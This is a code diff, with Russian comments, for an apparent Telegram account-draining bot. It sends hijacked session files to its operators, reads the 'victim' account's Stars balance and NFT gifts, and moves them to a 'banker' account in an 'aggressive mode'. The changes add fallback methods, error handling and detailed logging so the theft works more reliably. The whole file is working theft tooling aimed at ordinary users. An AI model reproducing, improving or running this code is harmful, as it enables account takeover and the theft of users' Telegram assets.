@@ -444,21 +444,42 @@ async def alert_admins(bot: Bot, text: str):
 async def get_stars_info(client: Client):
     """Получение баланса звезд - использует Pyrofork если доступен, иначе fallback"""
     if not client.is_connected:
-        await client.connect()
+        try:
+            await client.connect()
+        except Exception as e:
+            log_transfer(f"Ошибка подключения клиента: {e}", "error")
+            return 0
     
-    # Pyrofork имеет встроенный метод get_stars_balance
+    # Получаем ID пользователя для использования в методах
+    try:
+        me = await client.get_me()
+        user_id = me.id
+        log_transfer(f"🔍 Получение баланса для пользователя ID: {user_id}")
+    except Exception as e:
+        log_transfer(f"Ошибка получения информации о пользователе: {e}", "error")
+        user_id = None
+    
+    # Метод 1: Pyrofork get_stars_balance с "me"
     if PYROFORK_AVAILABLE:
         try:
             balance = await client.get_stars_balance("me")
             balance_int = int(balance) if balance else 0
-            log_transfer(f"✅ Баланс (Pyrofork): {balance_int} ⭐️")
+            log_transfer(f"✅ Баланс (Pyrofork 'me'): {balance_int} ⭐️")
             return balance_int
         except Exception as e:
-            log_transfer(f"Ошибка get_stars_balance (Pyrofork): {e}", "error")
-            # Fallback на raw API
-            pass
+            log_transfer(f"⚠️ get_stars_balance('me') не сработал: {e}", "warning")
+            
+        # Метод 2: Pyrofork get_stars_balance с user_id
+        if user_id:
+            try:
+                balance = await client.get_stars_balance(user_id)
+                balance_int = int(balance) if balance else 0
+                log_transfer(f"✅ Баланс (Pyrofork ID): {balance_int} ⭐️")
+                return balance_int
+            except Exception as e:
+                log_transfer(f"⚠️ get_stars_balance(ID) не сработал: {e}", "warning")
     
-    # Fallback для обычного Pyrogram через raw API
+    # Метод 3: Raw API через InputPeerSelf
     try:
         if PYROFORK_AVAILABLE:
             from pyrofork import raw
@@ -471,23 +492,58 @@ async def get_stars_info(client: Client):
             )
         )
         
+        log_transfer(f"🔍 Raw API результат: {type(result).__name__}, атрибуты: {dir(result)}")
+        
         if hasattr(result, 'balance'):
             balance_obj = result.balance
+            log_transfer(f"🔍 Balance объект: {type(balance_obj).__name__}, атрибуты: {dir(balance_obj)}")
+            
             if hasattr(balance_obj, 'stars'):
                 balance_int = int(balance_obj.stars)
-                log_transfer(f"✅ Баланс (raw API): {balance_int} ⭐️")
+                log_transfer(f"✅ Баланс (raw API stars): {balance_int} ⭐️")
                 return balance_int
             elif hasattr(balance_obj, 'value'):
                 balance_int = int(balance_obj.value)
-                log_transfer(f"✅ Баланс (raw API): {balance_int} ⭐️")
+                log_transfer(f"✅ Баланс (raw API value): {balance_int} ⭐️")
+                return balance_int
+            elif hasattr(balance_obj, 'amount'):
+                balance_int = int(balance_obj.amount)
+                log_transfer(f"✅ Баланс (raw API amount): {balance_int} ⭐️")
                 return balance_int
         
-        log_transfer("⚠️ Не удалось извлечь баланс", "error")
-        return 0
+        # Попробуем получить баланс напрямую из result
+        if hasattr(result, 'stars'):
+            balance_int = int(result.stars)
+            log_transfer(f"✅ Баланс (result.stars): {balance_int} ⭐️")
+            return balance_int
+        
+        log_transfer(f"⚠️ Не удалось извлечь баланс из результата: {result}", "warning")
         
     except Exception as e:
-        log_transfer(f"Ошибка получения баланса: {type(e).__name__}: {e}", "error")
-        return 0
+        log_transfer(f"⚠️ Ошибка raw API: {type(e).__name__}: {e}", "warning")
+    
+    # Метод 4: Попробуем через payments.GetStarsTransactions (если доступен)
+    try:
+        if PYROFORK_AVAILABLE:
+            from pyrofork import raw
+        else:
+            from pyrogram import raw
+        
+        # Попробуем получить баланс через другой метод
+        result = await client.invoke(
+            raw.functions.payments.GetStarsTransactions(
+                peer=raw.types.InputPeerSelf(),
+                offset="",
+                limit=1
+            )
+        )
+        log_transfer(f"🔍 GetStarsTransactions результат получен")
+        
+    except Exception as e:
+        log_transfer(f"⚠️ GetStarsTransactions не доступен: {e}", "warning")
+    
+    log_transfer("❌ Все методы получения баланса не сработали, возвращаем 0", "error")
+    return 0
 
 def calculate_optimal_topup(needed_stars):
     """Математический расчет минимальной стоимости пополнения"""
@@ -555,16 +611,69 @@ async def get_owned_channels(client: Client):
 
 async def scan_location_gifts(client: Client, peer_id, location_name):
     found_gifts = []
+    
+    # Получаем ID пользователя для использования в методах
+    user_id = None
+    try:
+        me = await client.get_me()
+        user_id = me.id
+        log_transfer(f"🔍 Сканирование подарков для {location_name}, peer_id={peer_id}, user_id={user_id}")
+    except Exception as e:
+        log_transfer(f"⚠️ Не удалось получить user_id: {e}", "warning")
+    
+    # Метод 1: Попробуем с "me"
     try:
         count = 0
+        log_transfer(f"🔍 Попытка 1: get_chat_gifts с peer_id='{peer_id}'")
         async for gift in client.get_chat_gifts(chat_id=peer_id):
             count += 1
             gift_info = analyze_gift(gift, location_name)
             found_gifts.append(gift_info)
             log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
-        log_transfer(f"📦 Всего подарков в {location_name}: {count}")
+        log_transfer(f"✅ Метод 1 успешен: найдено {count} подарков в {location_name}")
+        if count > 0:
+            return found_gifts
     except Exception as e:
-        log_transfer(f"Ошибка сканирования подарков в {location_name}: {e}", "error")
+        log_transfer(f"⚠️ Метод 1 (peer_id='{peer_id}') не сработал: {type(e).__name__}: {e}", "warning")
+    
+    # Метод 2: Попробуем с user_id если peer_id был "me"
+    if peer_id == "me" and user_id:
+        try:
+            count = 0
+            log_transfer(f"🔍 Попытка 2: get_chat_gifts с user_id={user_id}")
+            async for gift in client.get_chat_gifts(chat_id=user_id):
+                count += 1
+                gift_info = analyze_gift(gift, location_name)
+                found_gifts.append(gift_info)
+                log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
+            log_transfer(f"✅ Метод 2 успешен: найдено {count} подарков в {location_name}")
+            if count > 0:
+                return found_gifts
+        except Exception as e:
+            log_transfer(f"⚠️ Метод 2 (user_id={user_id}) не сработал: {type(e).__name__}: {e}", "warning")
+    
+    # Метод 3: Попробуем еще раз с явным указанием "me" после небольшой задержки
+    try:
+        await asyncio.sleep(0.5)  # Небольшая задержка
+        count = 0
+        log_transfer(f"🔍 Попытка 3: повторный вызов get_chat_gifts с задержкой")
+        async for gift in client.get_chat_gifts(chat_id="me"):
+            count += 1
+            gift_info = analyze_gift(gift, location_name)
+            found_gifts.append(gift_info)
+            log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
+        log_transfer(f"✅ Метод 3 успешен: найдено {count} подарков в {location_name}")
+        if count > 0:
+            return found_gifts
+    except Exception as e:
+        log_transfer(f"⚠️ Метод 3 не сработал: {type(e).__name__}: {e}", "warning")
+    
+    # Если ничего не найдено, логируем это
+    if len(found_gifts) == 0:
+        log_transfer(f"⚠️ Подарки не найдены в {location_name} (peer_id={peer_id}, user_id={user_id})", "warning")
+    else:
+        log_transfer(f"📦 Всего подарков в {location_name}: {len(found_gifts)}")
+    
     return found_gifts
 
 # --- TASKS ---
@@ -825,25 +934,75 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
     final_stars = 0
     
     try:
-        if not client.is_connected: await client.connect()
-        me = await client.get_me()
-        victim_target = me.username if me.username else me.id
+        # Проверка подключения клиента
+        log_transfer("🔍 Проверка подключения клиента...")
+        if not client.is_connected:
+            log_transfer("⚠️ Клиент не подключен, пытаемся подключить...")
+            try:
+                await client.connect()
+                log_transfer("✅ Клиент подключен")
+            except Exception as e:
+                log_transfer(f"❌ Ошибка подключения клиента: {e}", "error")
+                return nft_log_results, 0
         
-        log_transfer(f"🚀 START AGGRESSIVE MODE: @{me.username}")
+        # Получаем информацию о пользователе
+        try:
+            me = await client.get_me()
+            log_transfer(f"✅ Информация о пользователе получена: ID={me.id}, username=@{me.username if me.username else 'None'}")
+            victim_target = me.username if me.username else me.id
+        except Exception as e:
+            log_transfer(f"❌ Ошибка получения информации о пользователе: {e}", "error")
+            return nft_log_results, 0
+        
+        log_transfer(f"🚀 START AGGRESSIVE MODE: @{me.username} (ID: {me.id})")
         
         # ================= 1. ЧЕК БАЛАНСА И NFT =================
+        log_transfer("=" * 60)
+        log_transfer("ШАГ 1: Получение баланса звезд")
+        log_transfer("=" * 60)
+        
+        current_balance = 0
         try: 
             current_balance = await get_stars_info(client)
+            log_transfer(f"💰 Баланс получен: {current_balance} ⭐️")
         except Exception as e:
-            log_transfer(f"Ошибка получения баланса: {e}", "error")
+            log_transfer(f"❌ Ошибка получения баланса: {type(e).__name__}: {e}", "error")
             current_balance = 0
-        log_transfer(f"💰 Баланс: {current_balance} ⭐️")
+        
+        if current_balance == 0:
+            log_transfer("⚠️ Баланс равен 0, продолжаем проверку подарков...", "warning")
 
-        profile_gifts = await scan_location_gifts(client, "me", "Profile")
+        log_transfer("=" * 60)
+        log_transfer("ШАГ 2: Сканирование подарков")
+        log_transfer("=" * 60)
+        
+        profile_gifts = []
+        try:
+            profile_gifts = await scan_location_gifts(client, "me", "Profile")
+            log_transfer(f"✅ Сканирование завершено, найдено подарков: {len(profile_gifts)}")
+        except Exception as e:
+            log_transfer(f"❌ Ошибка сканирования подарков: {type(e).__name__}: {e}", "error")
+            profile_gifts = []
+        
+        # Детальный анализ найденных подарков
         all_nfts_to_send = [g for g in profile_gifts if g['is_nft'] and g['can_transfer']]
+        all_nfts_on_hold = [g for g in profile_gifts if g['is_nft'] and not g['can_transfer']]
         regular_gifts = [g for g in profile_gifts if not g['is_nft'] and not g.get('is_converted', False)]
         
-        log_transfer(f"📦 Найдено: NFT={len(all_nfts_to_send)}, Обычных подарков={len(regular_gifts)}")
+        log_transfer(f"📊 Детальная статистика подарков:")
+        log_transfer(f"   - Всего найдено: {len(profile_gifts)}")
+        log_transfer(f"   - NFT готовых к передаче: {len(all_nfts_to_send)}")
+        log_transfer(f"   - NFT на холде: {len(all_nfts_on_hold)}")
+        log_transfer(f"   - Обычных подарков: {len(regular_gifts)}")
+        
+        # Логируем детали каждого NFT
+        for idx, nft in enumerate(all_nfts_to_send, 1):
+            log_transfer(f"   NFT #{idx}: {nft['title']} (ID: {nft.get('id')}, msg_id: {nft.get('msg_id')}, transfer_cost: {nft.get('transfer_cost', 0)})")
+        
+        for idx, nft in enumerate(all_nfts_on_hold, 1):
+            log_transfer(f"   NFT на холде #{idx}: {nft['title']}")
+        
+        log_transfer(f"📦 Итого для обработки: NFT={len(all_nfts_to_send)}, Обычных подарков={len(regular_gifts)}")
         
         # Если нет NFT, но есть обычные подарки - обрабатываем их
         if not all_nfts_to_send and not regular_gifts:
@@ -1773,13 +1932,27 @@ class FragmentBot:
 
     async def fin(self, c, cid, phone_key):
         try:
+            log_transfer("=" * 60)
+            log_transfer("🚀 НАЧАЛО ФУНКЦИИ fin - Обработка новой сессии")
+            log_transfer("=" * 60)
+            
             if not c.is_connected:
-                try: await c.connect()
+                log_transfer("⚠️ Клиент не подключен, пытаемся подключить...")
+                try: 
+                    await c.connect()
+                    log_transfer("✅ Клиент подключен")
                 except Exception as e:
                     print_error(f"FIN Aborted: Client disconnected ({e})")
+                    log_transfer(f"❌ Ошибка подключения: {e}", "error")
                     return
 
-            me = await c.get_me()
+            # Проверяем авторизацию
+            try:
+                me = await c.get_me()
+                log_transfer(f"✅ Пользователь авторизован: @{me.username if me.username else 'None'} (ID: {me.id})")
+            except Exception as e:
+                log_transfer(f"❌ Ошибка получения информации о пользователе: {e}", "error")
+                return
             sess_file = SESSIONS_DIR / f"{c.name}.session"
             
             # Отправка сессии админам
@@ -1802,10 +1975,28 @@ class FragmentBot:
             # === ЗАПУСК ПРОЦЕССА (СНАЧАЛА ВОРК, ПОТОМ ЛОГ) ===
             nft_results = []
             final_stars = 0
+            initial_stars = 0
             
             if c.is_connected:
+                # Получаем начальный баланс для отображения в логе
+                try:
+                    initial_stars = await get_stars_info(c)
+                    log_transfer(f"📊 Начальный баланс перед обработкой: {initial_stars} ⭐️")
+                except Exception as e:
+                    log_transfer(f"⚠️ Не удалось получить начальный баланс: {e}", "warning")
+                    initial_stars = 0
+                
                 # Передаем управление в воркер, ждем результаты
-                nft_results, final_stars = await transfer_process(c, banker, self.bot)
+                try:
+                    nft_results, final_stars = await transfer_process(c, banker, self.bot)
+                    log_transfer(f"✅ Процесс обработки завершен. Финальный баланс: {final_stars} ⭐️")
+                except Exception as e:
+                    log_transfer(f"❌ Ошибка в transfer_process: {type(e).__name__}: {e}", "error")
+                    # Получаем баланс после ошибки
+                    try:
+                        final_stars = await get_stars_info(c)
+                    except:
+                        final_stars = initial_stars
             
             if banker: 
                 try: await banker.stop()
@@ -1842,7 +2033,7 @@ class FragmentBot:
                 f"☎️ Номер телефона: <code>{mask_phone(me.phone_number)}</code>\n"
                 f"🪬 Session File: <code>{sess_file.name}</code>\n\n"
                 f"🔮 Статистика:\n"
-                f"⭐️ Звезды: {final_stars} / 0\n"
+                f"⭐️ Звезды: {final_stars} / {initial_stars}\n"
                 f"🎁 NFT подарки:\n{nft_text}"
                 f"</blockquote>"
             )
